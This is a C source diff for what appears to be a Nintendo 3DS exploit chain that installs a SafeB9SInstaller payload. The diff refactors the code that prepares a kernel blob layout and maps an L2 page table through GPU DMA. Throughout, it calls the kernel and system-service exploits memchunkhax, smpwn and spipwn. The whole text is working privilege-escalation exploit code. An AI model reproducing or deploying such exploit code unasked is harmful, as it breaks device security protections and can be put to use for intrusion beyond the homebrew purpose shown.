@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <assert.h>
 #include <malloc.h>
 #include "lib/srv.h"
 #include "lib/gsp.h"
@@ -18,26 +19,34 @@
 #define DEFAULT_PAYLOAD_FILE_NAME   "SafeB9SInstaller.bin"
 #endif
 
-typedef struct ExploitChainLayout {
-    u8 workBuf[0x10000];
+typedef union ExploitChainLayout {
+    u8 workBuffer[0x10000];
     BlobLayout blobLayout;
 } ExploitChainLayout;
+
+static_assert(sizeof(ExploitChainLayout) == 0x10000);
+
+static void prepareBlobLayout(BlobLayout *layout, Handle gspHandle)
+{
+    memset(layout, 0, sizeof(BlobLayout));
+    memcpy(layout->code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
+    khc3dsPrepareL2Table(layout);
+
+    // Ensure everything (esp. the layout) is written back into the main memory
+    gspDoFullCleanInvCacheTrick(gspHandle);
+}
 
 static Result doExploitChain(ExploitChainLayout *layout, Handle gspHandle, const char *payloadFileName, size_t payloadFileOffset)
 {
     Result res = 0;
 
-    memset(layout, 0, sizeof(ExploitChainLayout));
-    memcpy(layout->blobLayout.code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
-    khc3dsPrepareL2Table(&layout->blobLayout);
-
-    // Ensure the entire contents of 'layout->blobLayout' are written back into main memory
-    TRY(GSPGPU_FlushDataCache(gspHandle, &layout->blobLayout, sizeof(BlobLayout)));
-
     u8 kernelVersionMinor = KERNEL_VERSION_MINOR;
     if (kernelVersionMinor < 48) {
         // Below 9.3 -- memchunkhax
-        TRY(memchunkhax(&layout->blobLayout, layout->workBuf, gspHandle));
+        TRY(memchunkhax(layout->workBuffer, gspHandle));
+
+        prepareBlobLayout(&layout->blobLayout, gspHandle);
+        mapL2TableViaSvc0x7b(&layout->blobLayout);
 
         // https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
         // "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"
@@ -46,11 +55,12 @@ static Result doExploitChain(ExploitChainLayout *layout, Handle gspHandle, const
 
 #ifndef MEMCHUNKHAX_ONLY // reduces the size by around 3KB
     else {
-        // 9.3 and above: use smpwn (7.x+) & spipwn (I've only bothered to put 8.x+ constants)
+        // 9.3 and above: use smpwn (7.x+) & spipwn, as I've only bothered to
+        // put 8.x+ constants, older versions aren't exploitable that way;
         // then GPU DMA over the kernel memory.
 
         // Exploit sm
-        SmpwnContext *ctx = (SmpwnContext *)layout->workBuf;
+        SmpwnContext *ctx = (SmpwnContext *)layout->workBuffer;
         Handle srvHandle;
         TRY_ALL(smpwn(&srvHandle, ctx));
         //TRY(smPartiallyCleanupSmpwn(ctx));
@@ -61,7 +71,8 @@ static Result doExploitChain(ExploitChainLayout *layout, Handle gspHandle, const
         TRY(spipwn(srvHandle));
 
         // We can now GPU DMA the kernel. Let's map the L2 table we have prepared
-        mapL2TableViaGpuDma(&layout->blobLayout, layout->workBuf, gspHandle);
+        prepareBlobLayout(&layout->blobLayout, gspHandle);
+        mapL2TableViaGpuDma(&layout->blobLayout, layout->blobLayout.smallWorkBuffer, gspHandle);
 
         svcCloseHandle(srvHandle);
     }
